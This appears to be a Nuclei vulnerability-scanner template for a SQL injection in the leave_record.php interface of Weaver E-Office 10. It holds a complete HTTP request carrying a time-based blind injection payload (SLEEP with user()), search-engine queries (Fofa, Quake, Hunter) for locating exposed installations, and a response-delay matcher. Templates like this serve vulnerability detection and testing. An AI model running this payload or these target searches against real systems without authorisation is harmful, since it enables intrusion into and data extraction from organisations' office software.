id: Weaver_E-Office10_leave_record_SQLi

info:
  name: Weaver_E-Office10_leave_record_SQLi
  author: HK
  severity: high
  description: 泛微E-office-10接口leave_record.php存在SQL注入漏洞
  metadata:
    max-request: 1
    Fofa-query: body="/eoffice10/client/web/"
    Quake-query: body="/eoffice10/client/web/"
    Hunter-query: body="/eoffice10/client/web/"
    verified: true

http:
- raw:
  - |+
    @timeout: 30s
    GET /eoffice10/server/ext/system_support/leave_record.php?flow_id=1%27+AND+%28SELECT+4196+FROM+%28SELECT%28SLEEP%281%29%29%29LWzs%29+AND+%27zfNf%27%3D%27zfNf&run_id=1&table_field=1&table_field_name=user()&max_rows=10 HTTP/1.1
    Host: {{Hostname}}
    User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:122.0) Gecko/20100101 Firefox/122.0
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
    Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
    Accept-Encoding: gzip, deflate
    Connection: close
    Upgrade-Insecure-Requests: 1


  redirects: true
  matchers-condition: and
  matchers:
    - type: dsl
      dsl:
        - 'duration >= 4'